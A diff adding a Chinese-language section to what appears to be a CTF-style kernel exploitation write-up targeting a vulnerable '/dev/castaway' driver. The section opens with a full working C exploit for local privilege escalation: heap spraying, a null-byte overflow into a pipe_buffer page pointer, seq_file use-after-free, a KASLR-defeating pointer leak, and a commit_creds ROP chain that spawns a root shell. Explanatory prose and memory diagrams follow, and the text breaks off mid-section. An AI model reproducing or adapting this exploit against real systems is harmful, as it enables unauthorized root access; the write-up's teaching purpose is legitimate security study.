@@ -3065,9 +3065,914 @@ execve() → __x64_sys_execve() → do_execve() → 加载并执行shell
               height: auto;">
 </div>
 
+## 6. 进阶分析：Poison Null Byte 技术实现
+
+exploit核心代码如下：
+
+```c
+/* Absolute kernel symbol addresses in default image (base 0xffffffff81000000) */
+#define PREPARE_KERNEL_CRED                        0xffffffff8106a880
+#define COMMIT_CREDS                               0xffffffff8106a6e0
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81400cb0
+#define SINGLE_START                               0xffffffff8114bac0
+
+#define POP_RDI_RET                                0xffffffff8120395c
+#define POP_RCX_BX_12_BP_RET                       0xffffffff8137cfd3
+#define MOV_RDI_RAX_MOVSQ_RET                      0xffffffff813965ea
+#define PUSH_RSI_JMP_RSI_39                        0xffffffff8124e1f7
+#define POP_RSP_BP_RET                             0xffffffff8124b1e3
+#define ADD_RSP_0X40_RET                           0xffffffff81151191
+
+/* Configuration constants */
+#define CHUNK_SIZE                                 512
+#define ISO_SLAB_LIMIT                             8
+#define INITIAL_PAGE_SPRAY                         500
+#define FINAL_PAGE_SPRAY                           30
+#define MAX_SEQ_FDS                                0x100
+#define MAX_PIPES                                  0x40
+
+/* Global variables */
+int dev_fd;
+int seq_fd[MAX_SEQ_FDS];
+int pipe_fds[MAX_PIPES][2];
+size_t pipe_data[0x4000 / 8];
+size_t seq_file_data[0x1000];
+char evil_data[0x1000];
+int evil_pipe_index = -1;
+int victim_pipe_index = -1;
+size_t *rop_chain = NULL;
+
+/* Structure for user request to driver */
+struct user_req {
+    int64_t idx;
+    uint64_t size;
+    char *buf;
+};
+
+/* Structure to track isolated slab pages */
+struct full_page {
+    bool in_use;
+    int idx[ISO_SLAB_LIMIT];
+};
+
+struct full_page isolation_pages[FINAL_PAGE_SPRAY] = {0};
+
+/*
+ * Device interaction wrappers
+ */
+int64_t alloc_chunk(void) {
+    return ioctl(dev_fd, 0xCAFEBABE, 0);
+}
+
+int64_t edit_chunk(int64_t idx, uint64_t size, char *buf) {
+    struct user_req req = {.idx = idx, .size = size, .buf = buf};
+    return ioctl(dev_fd, 0xF00DBABE, (unsigned long)&req);
+}
+
+/*
+ * Manage vulnerable driver chunks within isolation pages
+ */
+void alloc_vuln_page(struct full_page *pages, int page_idx) {
+    assert(page_idx < FINAL_PAGE_SPRAY);
+    assert(!pages[page_idx].in_use);
+
+    for (int i = 0; i < ISO_SLAB_LIMIT; i++) {
+        long result = alloc_chunk();
+        if (result < 0) {
+            log.error("alloc_vuln_page: allocation failed at page %d, chunk %d", page_idx, i);
+            exit(-1);
+        }
+        pages[page_idx].idx[i] = result;
+    }
+    pages[page_idx].in_use = true;
+}
+
+void edit_vuln_page(struct full_page *pages, int page_idx, uint8_t *buf, size_t sz) {
+    assert(page_idx < FINAL_PAGE_SPRAY);
+    assert(pages[page_idx].in_use);
+
+    for (int i = 0; i < ISO_SLAB_LIMIT; i++) {
+        long result = edit_chunk(pages[page_idx].idx[i], sz, buf);
+        if (result < 0) {
+            log.error("edit_vuln_page: edit failed at page %d, chunk %d", page_idx, i);
+            exit(-1);
+        }
+    }
+}
+
+/*
+ * seq_file and pipe helpers
+ */
+void alloc_seq_file(int i) {
+    seq_fd[i] = open("/proc/self/stat", O_RDONLY);
+    if (seq_fd[i] < 0) {
+        log.error("alloc_seq_file: failed to open /proc/self/stat");
+        exit(-1);
+    }
+    read(seq_fd[i], (char *)pipe_data, 0x8);
+}
+
+void alloc_pipe_buff(int i) {
+    if (pipe(pipe_fds[i]) < 0) {
+        log.error("Failed to create pipe");
+        return;
+    }
+}
+
+void resize_pipe_buff(int i, int size) {
+    if (fcntl(pipe_fds[i][0], F_SETPIPE_SZ, size) < 0) {
+        log.error("Failed to resize pipe");
+        return;
+    }
+}
+
+/*
+ * Resource cleanup
+ */
+void cleanup(void) {
+    for (int i = 0; i < MAX_SEQ_FDS; i++) {
+        if (seq_fd[i] > 0) close(seq_fd[i]);
+    }
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if (pipe_fds[i][0] > 0) close(pipe_fds[i][0]);
+        if (pipe_fds[i][1] > 0) close(pipe_fds[i][1]);
+    }
+    if (dev_fd > 0) close(dev_fd);
+}
+
+/******************************************************************************
+ * MAIN EXPLOIT LOGIC
+ *****************************************************************************/
+int main(int argc, char **argv) {
+    /* Phase 0: Prepare environment */
+    log.info("==============================================");
+    log.info("Phase 0: Prepare environment");
+    log.info("==============================================");
+    bind_core(0);
+    save_status();
+
+    /* Phase 1: Device initialization */
+    log.info("==============================================");
+    log.info("Phase 1: Device initialization");
+    log.info("==============================================");
+
+    /* Phase 1-1: Open vulnerable device */
+    log.info("Phase 1-1: Opening /dev/castaway device");
+    dev_fd = open("/dev/castaway", O_RDWR);
+    if (dev_fd < 0) {
+        log.error("Phase 1-1: Failed to open /dev/castaway device");
+        exit(-1);
+    }
+    log.success("Phase 1-1: Opened /dev/castaway device (fd: %d)", dev_fd);
+
+    /* Phase 1-2: Initialize page spraying system */
+    log.info("Phase 1-2: Initializing page spray infrastructure");
+    prepare_pgv_system();
+
+    /* Phase 2: Memory preparation and slab isolation */
+    log.info("==============================================");
+    log.info("Phase 2: Memory preparation and slab isolation");
+    log.info("==============================================");
+
+    /* Phase 2-1: Mark pipe buffers for collision detection */
+    log.info("Phase 2-1: Marking pipe buffers with magic values for collision detection");
+    for (int i = 0; i < MAX_PIPES; i++) {
+        alloc_pipe_buff(i);
+        seq_file_data[0] = *(size_t*)"BinRacer";
+        seq_file_data[1] = i;
+        write(pipe_fds[i][1], seq_file_data, 0x70);
+    }
+
+    /* Phase 2-2: Spray order-0 pages via socket buffers */
+    log.info("Phase 2-2: Spraying %d order-0 pages via socket buffers", INITIAL_PAGE_SPRAY);
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
+        if (alloc_page(i, 0x1000, 1) < 0) {
+            log.error("Phase 2-2: Failed to allocate socket page at index %d", i);
+            exit(-1);
+        }
+    }
+
+    /* Phase 2-3: Create memory holes for slab isolation */
+    log.info("Phase 2-3: Creating memory holes for slab isolation");
+    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+
+    /* Phase 2-4: Place pipe buffers in kmalloc-512 slabs */
+    log.info("Phase 2-4: Placing pipe buffers in kmalloc-512 slabs");
+    for (int i = 0; i < MAX_PIPES; i++) resize_pipe_buff(i, 0x1000 * 8);
+
+    /* Phase 2-5: Free remaining pages to isolate target slab */
+    log.info("Phase 2-5: Freeing remaining pages to isolate target slab");
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+    log.success("Phase 2-5: Target slab isolated");
+
+    /* Phase 3: Cross-cache overflow and info leak */
+    log.info("==============================================");
+    log.info("Phase 3: Cross-cache overflow and info leak");
+    log.info("==============================================");
+
+    /* Phase 3-1: Execute cross-cache overflow */
+    log.info("Phase 3-1: Executing cross-cache overflow on %d pages", FINAL_PAGE_SPRAY);
+    for (int i = 0; i < FINAL_PAGE_SPRAY; i++) {
+        alloc_vuln_page(isolation_pages, i);
+    }
+    log.success("Phase 3-1: Cross-cache overflow completed");
+
+    /* Phase 3-2: Prepare overflow data to corrupt adjacent object */
+    log.info("Phase 3-2: Preparing overflow data to corrupt adjacent object");
+    memset(evil_data, 0, CHUNK_SIZE);
+    size_t evil_addr = 0x00;
+    memcpy(&evil_data[CHUNK_SIZE - 6], &evil_addr, 6);
+    edit_vuln_page(isolation_pages, 0, evil_data, CHUNK_SIZE - 5);
+    log.success("Phase 3-2: Overflow data written");
+
+    /* Phase 3-3: Find corrupted pipe_buffer for info leak */
+    log.info("Phase 3-3: Searching for corrupted pipe_buffer for info leak");
+    for (int i = 0; i < MAX_PIPES; i++) {
+        memset(seq_file_data, 0, 0x40);
+        read(pipe_fds[i][0], seq_file_data, 0x40);
+        if (seq_file_data[0] == 0x72656361526e6942 && seq_file_data[1] != i) {
+            victim_pipe_index = seq_file_data[1];
+            evil_pipe_index = i;
+            hex_dump("Phase 3-3: Leaked overlap pipe_buffer:", (char *)seq_file_data, 0x40);
+            log.success("Phase 3-3: Found victim pipe: %d, evil pipe: %d", victim_pipe_index, evil_pipe_index);
+        }
+    }
+
+    if (evil_pipe_index == -1) {
+        log.error("Phase 3-3: Failed to find corrupted pipe, exploit aborted");
+        cleanup();
+        exit(-1);
+    }
+
+    /* Phase 3-4: Reallocate victim slot with seq_file */
+    log.info("Phase 3-4: Replacing victim pipe with seq_file for kernel pointer leak");
+    close(pipe_fds[victim_pipe_index][0]);
+    close(pipe_fds[victim_pipe_index][1]);
+
+    for (int i = 0; i < MAX_SEQ_FDS; i++) alloc_seq_file(i);
+
+    /* Phase 3-5: Leak kernel addresses from overlapped seq_file */
+    memset(seq_file_data, 0, 0x30);
+    read(pipe_fds[evil_pipe_index][0], seq_file_data, 0x30);
+    size_t seq_file_addr = seq_file_data[0] - 0x40;
+    size_t seq_ops_addr = seq_file_data[2];
+    hex_dump("Phase 3-3: Leaked seq_file:", (char *)seq_file_data, 0x30);
+    log.success("Phase 3-3: Leaked seq_file_addr: 0x%lx", seq_file_addr);
+    log.success("Phase 3-3: Leaked seq_ops_addr: 0x%lx", seq_ops_addr);
+
+    /* Phase 4: RIP control and privilege escalation */
+    log.info("==============================================");
+    log.info("Phase 4: RIP control and privilege escalation");
+    log.info("==============================================");
+
+    /* Phase 4-1: Hijack seq_file->ops->start via corrupted pipe_buffer */
+    log.info("Phase 4-1: Hijacking seq_file->ops->start via corrupted pipe_buffer");
+    seq_file_data[0] = seq_ops_addr;
+    seq_file_data[1] = 0x20;
+    seq_file_data[2] = 0;
+    seq_file_data[3] = 0x20;
+    write(pipe_fds[evil_pipe_index][1], seq_file_data, 0x20);
+
+    /* Phase 4-2: Locate victim seq_file for RIP control */
+    log.info("Phase 4-2: Locating victim seq_file for RIP control");
+    int victim_seq_index = -1;
+    for (int i = 0; i < MAX_SEQ_FDS; i++) {
+        size_t seq_ops[4] = {0};
+        read(seq_fd[i], seq_ops, 0x20);
+        if (seq_ops[0] > kernel_base &&
+            ((seq_ops[0] & 0xfff) == (SINGLE_START & 0xfff))) {
+            kernel_offset = seq_ops[0] - SINGLE_START;
+            kernel_base += kernel_offset;
+            victim_seq_index = i;
+            log.success("Phase 4-2: Found victim seq_file at index %d", i);
+            log.success("Phase 4-2: Leaked single_start: 0x%lx", seq_ops[0]);
+            log.success("Phase 4-2: Kernel base: 0x%lx", kernel_base);
+            log.success("Phase 4-2: Kernel offset: 0x%lx", kernel_offset);
+            break;
+        }
+    }
+
+    if (victim_seq_index == -1) {
+        log.error("Phase 4-2: Failed to find victim seq_file for RIP control");
+        cleanup();
+        exit(-1);
+    }
+
+    /* Phase 4-3: Build ROP chain for privilege escalation */
+    log.info("Phase 4-3: Building ROP chain for privilege escalation");
+    rop_chain = (size_t*)((char *)seq_file_data - 0x20 + 0x28 + 0x39);
+    rop_chain[0] = kernel_offset + POP_RSP_BP_RET;
+
+    seq_file_data[0] = kernel_offset + PUSH_RSI_JMP_RSI_39;
+    seq_file_data[1] = 0;
+    seq_file_data[2] = kernel_offset + ADD_RSP_0X40_RET;
+    seq_file_data[3] = 0;
+    seq_file_data[4] = seq_file_addr + 0x40;
+    seq_file_data[5] = seq_file_addr + 0x40;
+    seq_file_data[6] = seq_file_addr + 0x20;
+
+    rop_chain = (size_t*)&seq_file_data[10];
+    int i = 0;
+    rop_chain[i++] = 0; // padding
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
+    rop_chain[i++] = kernel_offset + POP_RCX_BX_12_BP_RET;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + MOV_RDI_RAX_MOVSQ_RET;
+    rop_chain[i++] = kernel_offset + COMMIT_CREDS;
+    rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+    rop_chain[i++] = *(size_t *)"BinRacer";
+    rop_chain[i++] = *(size_t *)"BinRacer";
+    rop_chain[i++] = (size_t)get_root_shell;
+    rop_chain[i++] = user_cs;
+    rop_chain[i++] = user_rflags;
+    rop_chain[i++] = user_sp + 8;
+    rop_chain[i++] = user_ss;
+
+    /* Phase 4-4: Trigger ROP chain */
+    log.info("Phase 4-4: Writing ROP chain to corrupted pipe_buffer");
+    write(pipe_fds[evil_pipe_index][1], seq_file_data, 0x100);
+    log.info("Phase 4-4: Triggering ROP chain via seq_file read...");
+    read(seq_fd[victim_seq_index], seq_file_data, 0x8);
+
+    cleanup();
+    return 0;
+}
+```
+
+### 6-1. 技术背景与核心原理
+
+#### 6-1-1. 概念解析
+
+Poison Null Byte 是一种基于堆内存损坏的高级技术，其核心原理是通过精确的单字节溢出（null byte overflow），在特定条件下改变堆管理元数据或对象边界，从而创造内存布局异常。与传统的缓冲区溢出不同，这种技术仅通过一个空字节（0x00）的越界写入，即可引发连锁反应，打破SLUB分配器的预期行为。
+
+**技术特征对比**：
+
+| 特征维度 | 传统溢出技术     | Poison Null Byte 技术 |
+| -------- | ---------------- | --------------------- |
+| 覆写规模 | 大量数据覆写     | 单字节精确修改        |
+| 执行方式 | 直接代码执行尝试 | 间接内存布局操控      |
+| 目标范围 | 目标对象广泛     | 依赖特定堆分配模式    |
+| 检测难度 | 较易被检测       | 隐蔽性显著增强        |
+| 技术要求 | 相对较低         | 需精确堆布局控制      |
+
+#### 6-1-2. 技术实现概览
+
+本技术实现基于Linux内核的SLUB分配器特性，通过跨缓存溢出修改相邻`pipe_buffer`结构体的`page`指针字段，制造两个管道缓冲区共享同一物理页面的条件，进而利用释放后重用（UAF）实现信息泄露和控制流重定向。与第四章的技术实现相比，本方案采用了更精细的内存操作和更复杂的数据结构交互，体现了从基础溢出到高级堆操作的进化路径。
+
+```mermaid
+flowchart TD
+    A[🛠️ Poison Null Byte 技术流程] --> B[📁 阶段1:<br>环境准备与<br>设备初始化]
+    A --> C[🧩 阶段2:<br>精细化内存布局<br>塑造]
+    A --> D[💥 阶段3:<br>跨缓存溢出与<br>共享页面构造]
+    A --> E[🔍 阶段4:<br>UAF与信息泄露<br>地址获取]
+    A --> F[🎯 阶段5:<br>控制流<br>重定向]
+    A --> G[🚀 阶段6:<br>ROP链执行与<br>权限提升]
+
+    B -->|建立通信通道| C
+    C -->|构建内存拓扑| D
+    D -->|单字节溢出page指针| E
+    E -->|类型混淆| F
+    F -->|函数指针篡改| G
+
+    style A fill:#e1f5e1,stroke:#2e7d32,stroke-width:2px
+    style B fill:#bbdefb,stroke:#1976d2
+    style C fill:#ffecb3,stroke:#ffa000
+    style D fill:#ffcdd2,stroke:#d32f2f
+    style E fill:#dcedc8,stroke:#388e3c
+    style F fill:#ffe0b2,stroke:#f57c00
+    style G fill:#e1bee7,stroke:#7b1fa2
+```
+
+### 6-2. 环境准备与设备初始化
+
+#### 6-2-1. 执行环境标准化
+
+与技术实现主体架构一致，首先建立稳定的执行环境，确保技术实现的可靠性和可重复性。环境准备是所有后续操作的基础，其稳定性直接影响技术实现的成功率。
+
+**核心环境配置**：
+
+```c
+/* Phase 0: Prepare environment */
+log.info("==============================================");
+log.info("Phase 0: Prepare environment");
+log.info("==============================================");
+bind_core(0);
+save_status();
+```
+
+**关键组件说明**：
+
+- **核心绑定**：`bind_core(0)`将进程锁定至CPU 0，消除多处理器环境下的缓存一致性问题，确保内存操作的确定性
+- **状态保存**：`save_status()`完整保存用户态寄存器上下文，包括代码段选择子、栈指针、标志寄存器等，为内核态返回提供恢复基准
+- **错误处理**：集成完善的错误检测与资源清理机制，确保异常条件下的系统稳定性
+
+#### 6-2-2. 漏洞设备接口封装
+
+目标设备`/dev/castaway`提供标准化的内存操作接口，通过`ioctl`系统调用实现内核态内存的分配与编辑。设备接口的抽象封装提高了代码的可维护性和可读性。
+
+**设备操作抽象层**：
+
+```c
+/*
+ * Device interaction wrappers
+ */
+int64_t alloc_chunk(void) {
+    return ioctl(dev_fd, 0xCAFEBABE, 0);
+}
+
+int64_t edit_chunk(int64_t idx, uint64_t size, char *buf) {
+    struct user_req req = {.idx = idx, .size = size, .buf = buf};
+    return ioctl(dev_fd, 0xF00DBABE, (unsigned long)&req);
+}
+```
+
+**系统调用链分析**：
+
+```
+用户空间ioctl() → 系统调用入口__x64_sys_ioctl() → do_vfs_ioctl() → vfs_ioctl() →
+字符设备层chrdev_ioctl() → 设备驱动castaway_ioctl() → castaway_edit()执行内存操作
+```
+
+### 6-3. 精细化内存布局工程
+
+#### 6-3-1. 内存拓扑构建策略
+
+本阶段通过多层内存操作构建精确的物理内存布局，为后续的对象碰撞创造必要条件。内存布局的精确性是Poison Null Byte技术成功的关键，需要克服SLUB分配器的随机化机制。
+
+**布局构建步骤**：
+
+1. **标记管道缓冲区**：通过管道通信机制建立内存标识系统，为后续碰撞检测提供基准
+2. **大规模页面喷射**：利用套接字环形缓冲区分配连续物理内存，创造可控内存区域
+3. **规律性空洞创建**：间隔释放页面形成可预测内存空隙，为目标对象分配提供插槽
+4. **目标结构体放置**：在空隙中精准分配目标内核对象，确保物理内存相邻性
+5. **Slab隔离**：清除干扰页面形成纯净操作环境，提高技术实现成功率
+
+**管道标识系统建立**：
+
+```c
+/* Phase 2-1: Mark pipe buffers with magic values for collision detection */
+log.info("Phase 2-1: Marking pipe buffers with magic values for collision detection");
+for (int i = 0; i < MAX_PIPES; i++) {
+    alloc_pipe_buff(i);
+    seq_file_data[0] = *(size_t*)"BinRacer";
+    seq_file_data[1] = i;
+    write(pipe_fds[i][1], seq_file_data, 0x70);
+}
+```
+
+**用户空间到内核的完整调用链（管道创建）**：
+
+```
+用户空间pipe() → 系统调用__x64_sys_pipe2() → do_pipe2() →
+__do_pipe_flags() → 创建inode与文件结构 → alloc_pipe_info()分配pipe_buffer环形队列
+```
+
+**alloc_pipe_info() 关键行为**：
+
+- 调用`kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL)`分配pipe元信息结构
+- 调用`kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL)`分配pipe_buffer数组
+- 初始化环形队列头尾指针、等待队列、锁等元数据
+- 返回管道文件结构，供用户空间通过文件描述符访问
+
+**内存喷射与塑形**：
+
+```c
+/* Phase 2-2: Spray order-0 pages via socket buffers */
+log.info("Phase 2-2: Spraying %d order-0 pages via socket buffers", INITIAL_PAGE_SPRAY);
+for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
+    if (alloc_page(i, 0x1000, 1) < 0) {
+        log.error("Phase 2-2: Failed to allocate socket page at index %d", i);
+        exit(-1);
+    }
+}
+```
+
+#### 6-3-2. Slab隔离机制
+
+通过精确的内存释放与重新分配，在kmalloc-512缓存中创建隔离区域，确保目标对象的物理内存相邻性。Slab隔离是内存布局工程的核心环节，直接影响后续溢出的精确度。
+
+**空洞创建与对象放置**：
+
+```c
+/* Phase 2-3: Create memory holes for slab isolation */
+log.info("Phase 2-3: Creating memory holes for slab isolation");
+for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+```
+
+**管道缓冲区扩容（触发resize）**：
+
+```c
+/* Phase 2-4: Place pipe buffers in kmalloc-512 slabs */
+log.info("Phase 2-4: Placing pipe buffers in kmalloc-512 slabs");
+for (int i = 0; i < MAX_PIPES; i++) resize_pipe_buff(i, 0x1000 * 8);
+```
+
+**管道扩容内核调用链**：
+
+```
+用户空间fcntl(F_SETPIPE_SZ) → 系统调用__x64_sys_fcntl() → ksys_fcntl() →
+fdget()获取文件结构 → pipe_fcntl() → pipe_resize_ring()
+```
+
+**pipe_resize_ring() 关键操作**：
+
+- 验证新容量参数合法性，检查权限限制
+- 调用`round_pipe_size()`对齐环形缓冲区大小
+- 分配新`pipe_buffer`数组并迁移旧数据
+- 释放旧缓冲区回SLUB缓存（可能被后续重用）
+- 更新`pipe_inode_info`的缓冲区指针与容量
+
+**最终隔离操作**：
+
+```c
+/* Phase 2-5: Free remaining pages to isolate target slab */
+log.info("Phase 2-5: Freeing remaining pages to isolate target slab");
+for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+log.success("Phase 2-5: Target slab isolated");
+```
+
+#### 6-3-3. 关键内存布局图示
+
+<pre>
+初始内存布局（喷射后）：
+┌─────────┬─────────┬─────────┬─────────┬─────────┐
+│ Page 0  │ Page 1  │ Page 2  │ Page 3  │ Page 4  │  ← 顺序分配的物理页面
+└─────────┴─────────┴─────────┴─────────┴─────────┘
+
+规律性释放（间隔释放奇数页）：
+┌─────────┬─────────┬─────────┬─────────┬─────────┐
+│ Page 0  │ ❌ FREE│ Page 2  │ ❌ FREE │ Page 4  │  ← 棋盘式空洞布局
+└─────────┴─────────┴─────────┴─────────┴─────────┘
+
+管道缓冲区插入（填充空洞）：
+┌─────────┬───────────────────┬─────────┬───────────────────┬─────────┐
+│ Page 0  │ pipe_buffer_A     │ Page 2  │ pipe_buffer_B     │ Page 4  │
+│         │ (magic="BinRacer")│         │ (magic="BinRacer")│         │
+└─────────┴───────────────────┴─────────┴───────────────────┴─────────┘
+
+最终隔离（清除干扰页）：
+┌───────────────────┬───────────────────┬───────────────────┐
+│ pipe_buffer_A     │ pipe_buffer_B     │ pipe_buffer_C     │  ← 纯净的kmalloc-512 slab
+│ (magic="BinRacer")│ (magic="BinRacer")│ (magic="BinRacer")│
+└───────────────────┴───────────────────┴───────────────────┘
+</pre>
+
+### 6-4. 跨缓存溢出与共享页面构造
+
+#### 6-4-1. 漏洞触发与page指针损坏
+
+利用目标设备的编辑操作实现跨缓存溢出，通过单字节null溢出修改相邻`pipe_buffer`结构体的`page`指针字段。这种精确定向的溢出方式是Poison Null Byte技术的核心特征，旨在制造两个管道缓冲区共享同一物理页面的异常条件。
+
+**溢出数据构造**：
+
+```c
+/* Phase 3-2: Prepare overflow data to corrupt adjacent object */
+log.info("Phase 3-2: Preparing overflow data to corrupt adjacent object");
+memset(evil_data, 0, CHUNK_SIZE);
+size_t evil_addr = 0x00;
+memcpy(&evil_data[CHUNK_SIZE - 6], &evil_addr, 6);
+edit_vuln_page(isolation_pages, 0, evil_data, CHUNK_SIZE - 5);
+```
+
+**技术机理分析**：
+
+- **溢出点**：`CHUNK_SIZE - 5`的精确长度控制确保仅溢出单个null字节，瞄准`pipe_buffer`结构体的`page`指针低位
+- **目标字段**：`pipe_buffer->page`指针指向管道数据所在的物理页面，null字节覆写将其低字节清零
+- **共享效应**：若两个相邻`pipe_buffer`的`page`指针低字节清零后指向同一物理页面，即制造出共享内存条件
+- **隐蔽优势**：单字节修改难以被基于异常值检测的安全机制捕捉，且不破坏结构体其他关键字段
+
+#### 6-4-2. 共享页面检测
+
+通过预设的魔数字标识检测内存页面共享状态，确定溢出成功的具体实例。共享检测是实现后续UAF和信息泄露的前提步骤。
+
+**共享页面检测机制**：
+
+```c
+/* Phase 3-3: Search for corrupted pipe_buffer for shared page detection */
+for (int i = 0; i < MAX_PIPES; i++) {
+    memset(seq_file_data, 0, 0x40);
+    read(pipe_fds[i][0], seq_file_data, 0x40);
+    if (seq_file_data[0] == 0x72656361526e6942 && seq_file_data[1] != i) {
+        victim_pipe_index = seq_file_data[1];
+        evil_pipe_index = i;
+        log.success("Phase 3-3: Found victim pipe: %d, evil pipe: %d", victim_pipe_index, evil_pipe_index);
+    }
+}
+```
+
+**检测原理**：
+
+1. **魔数校验**：`0x72656361526e6942`对应字符串"BinRacer"的Little-Endian编码，作为唯一身份标识
+2. **索引异常**：读取到的管道索引与当前管道索引不符，表明两个管道缓冲区共享同一物理页面
+3. **共享确认**：受害者管道与邪恶管道指向同一内存区域，验证溢出成功构造共享条件
+
+#### 6-4-3. 内存损坏与共享页面图示
+
+<pre>
+溢出前内存布局（相邻pipe_buffer）：
+┌───────────────────────┬───────────────────────┐
+│ castaway_chunk        │ pipe_buffer_A         │
+│ (512字节可控数据)      │ (内核pipe_buffer结构体)│
+├───────────────────────┼───────────────────────┤
+│ 00 01 02 ... FE FF    │ page* | len | flags...│
+└───────────────────────┴───────────────────────┘
+                                    ↑
+                            指向独立物理页面
+
+单字节溢出（null byte写入page指针低位）：
+┌───────────────────────┬───────────────────────┐
+│ castaway_chunk        │ pipe_buffer_A         │
+│ (填充数据 + 0x00)      │ (page指针低字节清零)   │
+├───────────────────────┼───────────────────────┤
+│ ... FD FE FF 00       │ page0 | len | flags...│ 
+└───────────────────────┴───────────────────────┘
+                      ↑ null字节越界写入page指针低位
+
+后果：pipe_buffer_A->page低字节清零，与pipe_buffer_B->page指向同一物理页面：
+• 两个pipe_buffer共享同一物理内存区域
+• 任一管道释放将导致共享页面被回收
+• 另一管道仍持有对已释放页面的引用（UAF条件）
+</pre>
+
+### 6-5. UAF构造与信息泄露
+
+#### 6-5-1. 释放后重用（UAF）构造
+
+释放受害者管道对象，触发共享页面回收，并在相同物理内存位置分配`seq_file`结构体，利用释放后重用（Use-After-Free）实现类型混淆。内存重用是SLUB分配器的核心特性，也是本技术实现的关键依赖。
+
+**UAF构造操作**：
+
+```c
+/* Phase 3-4: Release victim pipe to free shared page, then reallocate with seq_file */
+close(pipe_fds[victim_pipe_index][0]);
+close(pipe_fds[victim_pipe_index][1]);
+
+for (int i = 0; i < MAX_SEQ_FDS; i++) alloc_seq_file(i);
+```
+
+**管道关闭内核调用链**：
+
+```
+用户空间close() → 系统调用__x64_sys_close() → ksys_close() →
+filp_close() → fput() → pipe_release()
+```
+
+**pipe_release() 释放流程**：
+
+- 递减管道引用计数，若归零则触发销毁
+- 遍历环形队列，对每个`pipe_buffer`调用`pipe_buf_release()`释放关联页面
+- 调用`free_pipe_info()`释放`pipe_inode_info`结构体和`pipe_buffer`数组
+- 被释放的物理页面返回页面分配器，成为空闲页面待重用
+
+**SLUB分配器行为分析**：
+
+- **释放时机**：`pipe_buf_release()`解除页面映射，`free_pipe_info()`回收pipe_buffer数组内存
+- **分配竞争**：密集的`seq_file`分配（通过`open("/proc/self/stat")`→`seq_open()`→`kzalloc()`）优先重用刚释放的热内存页面，利用内存分配器的LIFO策略
+- **类型混淆**：同一物理内存被重新解释为不同类型的内核对象（`pipe_buffer`→`seq_file`），打破类型安全假设
+- **UAF利用**：邪恶管道仍持有对已释放页面的引用，通过该管道读写操作可访问新分配的`seq_file`结构
+
+#### 6-5-2. 内核指针泄露
+
+通过共享页面的UAF条件读取`seq_file`结构内容，获取内核结构指针，计算内核基址与偏移量。信息泄露是现代内核安全机制绕过的关键步骤。
+
+**地址泄露实现**：
+
+```c
+/* Phase 3-5: Leak kernel addresses from UAF seq_file via shared page */
+memset(seq_file_data, 0, 0x30);
+read(pipe_fds[evil_pipe_index][0], seq_file_data, 0x30);
+size_t seq_file_addr = seq_file_data[0] - 0x40;
+size_t seq_ops_addr = seq_file_data[2];
+```
+
+**关键地址计算**：
+
+- `seq_file_addr`：泄露的`seq_file`结构体真实地址，通过固定偏移校正，用于后续ROP链栈布局计算
+- `seq_ops_addr`：`seq_operations`结构体指针，指向内核代码段的只读区域，用于推算内核镜像基址
+- **基址计算公式**：`kernel_offset = leaked_symbol - known_symbol_offset`，其中known_symbol_offset为默认镜像中的符号固定偏移
+- **KASLR绕过**：通过泄露的代码指针反推内核基址，成功绕过内核地址空间布局随机化保护
+
+#### 6-5-3. UAF内存布局图示
+
+<pre>
+类型混淆后的内存布局（原共享页面现被seq_file占用）：
+┌─────────────────────────────────────────────────────┐
+│ 原pipe_buffer共享页面（现存放seq_file结构体）         │
+├──────────────┬──────────────┬──────────────┬────────┤
+│ seq_file.buf │ seq_file.size│ seq_file.from│ ...    │
+│ （8字节指针） │ （8字节）     │ (8字节)      │        │
+├──────────────┼──────────────┼──────────────┼────────┤
+│ 0xffffXXXXXXXXXXX0          │ 0x0000000000000020    │
+└─────────────────────────────┴───────────────────────┘
+
+通过邪恶管道（仍持有页面引用）读取到的数据：
+┌─────────────────────────────────────────────────────┐
+│ 读取缓冲区内容（包含内核指针）                         │
+├──────────────┬──────────────┬──────────────┬────────┤
+│ buf_ptr      │ size_val     │ ops_ptr      │ ...    │
+│ (内核地址)    │ (用户数据)    │ (内核地址)   │        │
+├──────────────┼──────────────┼──────────────┼────────┤
+│ 0xffffXXXXXXXXXXX0          │ 0xffffXXXXYYYYYYY0    │
+└─────────────────────────────┴───────────────────────┘
+
+泄露指针用途：
+• buf_ptr → 推算seq_file结构体内核地址，构建ROP链栈布局
+• ops_ptr → 推算内核代码段基址，为ROP gadget定位提供基准
+• 双指针互验 → 交叉验证泄露地址的有效性与一致性
+</pre>
+
+### 6-6. 控制流重定向与执行
+
+#### 6-6-1. 函数指针篡改
+
+利用UAF条件修改`seq_file`的操作函数表，将控制流导向预定位置。这是控制流劫持的关键步骤，通过合法接口实现执行路径重定向。
+
+**指针篡改操作**：
+
+```c
+/* Phase 4-1: Hijack seq_file->ops->start via UAF shared page */
+seq_file_data[0] = seq_ops_addr;
+seq_file_data[1] = 0x20;
+seq_file_data[2] = 0;
+seq_file_data[3] = 0x20;
+write(pipe_fds[evil_pipe_index][1], seq_file_data, 0x20);
+```
+
+**控制流劫持路径**：
+
+```
+正常执行流: read() → vfs_read() → seq_read() → seq_operations->start()
+篡改后执行流: read() → vfs_read() → seq_read() → [被篡改的指针] → ROP链执行
+```
+
+#### 6-6-2. ROP链工程设计
+
+构建精密的ROP（Return-Oriented Programming）链，通过代码复用实现权限提升。ROP技术完全重用内核现有代码片段，无需注入任何外部代码，具有极高的隐蔽性。
+
+**栈布局设计**：
+
+```c
+/* Phase 4-3: Build ROP chain for privilege escalation */
